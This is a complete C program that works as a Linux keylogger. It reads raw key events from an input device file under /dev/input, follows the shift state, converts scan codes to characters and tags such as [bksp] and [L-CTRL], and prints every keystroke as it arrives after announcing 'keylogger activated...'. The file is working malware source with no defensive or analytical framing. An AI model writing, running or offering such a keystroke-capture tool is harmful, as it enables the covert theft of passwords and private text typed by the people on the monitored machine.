#include <fcntl.h>
#include <linux/input-event-codes.h>
#include <linux/input.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int shift_pressed = 0;
char *map_code(int code, char *num, int shift) {
    // Handling Numbers 1-9
    if (code >= 2 && code <= 10) {
        if (shift) {
            const char *syms[] = {"!", "@", "#", "$", "%", "^", "&", "*", "("};
            return (char *)syms[code - 2];
        }
        snprintf(num, 2, "%d", code - 1);
        return num;
    }
    
    if (code == 11) {
        return shift ? ")" : "0";
    }

    switch (code) {
        case 16: return shift ? "Q" : "q"; case 17: return shift ? "W" : "w";
        case 18: return shift ? "E" : "e"; case 19: return shift ? "R" : "r";
        case 20: return shift ? "T" : "t"; case 21: return shift ? "Y" : "y";
        case 22: return shift ? "U" : "u"; case 23: return shift ? "I" : "i";
        case 24: return shift ? "O" : "o"; case 25: return shift ? "P" : "p";
        case 30: return shift ? "A" : "a"; case 31: return shift ? "S" : "s";
        case 32: return shift ? "D" : "d"; case 33: return shift ? "F" : "f";
        case 34: return shift ? "G" : "g"; case 35: return shift ? "H" : "h";
        case 36: return shift ? "J" : "j"; case 37: return shift ? "K" : "k";
        case 38: return shift ? "L" : "l"; case 44: return shift ? "Z" : "z";
        case 45: return shift ? "X" : "x"; case 46: return shift ? "C" : "c";
        case 47: return shift ? "V" : "v"; case 48: return shift ? "B" : "b";
        case 49: return shift ? "N" : "n"; case 50: return shift ? "M" : "m";

        case 12: return shift ? "_" : "-";
        case 13: return shift ? "+" : "=";
        case 26: return shift ? "{" : "[";
        case 27: return shift ? "}" : "]";
        case 39: return shift ? ":" : ";";
        case 40: return shift ? "\"" : "'";
        case 41: return shift ? "~" : "`";
        case 43: return shift ? "|" : "\\";
        case 51: return shift ? "<" : ",";
        case 52: return shift ? ">" : ".";
        case 53: return shift ? "?" : "/";

        case 1:   return "[ESC]";
        case 14:  return "[bksp]";
        case 28:  return "\n";
        case 57:  return " ";
        case 29:  return "[L-CTRL]";
        case 97:  return "[R-CTRL]";
        case 56:  return "[L-ALT]";
        case 100: return "[R-ALT]";
        case 125: return "[SUPER]";
        case 58:  return "[CAPS]";

        default: return "";
    }
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <event-file>\n", argv[0]);
        exit(-1);
    };

    printf("keylogger activated...\n");
    char *num = malloc(2);
    int fd = open(argv[1], O_RDONLY, 0);
    struct input_event
        ie; // linux input_event struct to use when reading from
            // /dev/input/eventN where N is the number for your kb
    //printf("fd: %d\n\n", fd); // for debugging
    while (1) {
    if (read(fd, &ie, sizeof(ie)) <= 0) break;

    if (ie.type != EV_KEY) continue;

    if (ie.code == 42 || ie.code == 54) {
        if (ie.value == 1) shift_pressed = 1;
        else if (ie.value == 0) shift_pressed = 0;
        continue; 
    }

    if (ie.value == 0) continue;

    // 3. Map and print
    printf("%s", map_code(ie.code, num,shift_pressed));
    fflush(stdout);
} 
    free(num);
}
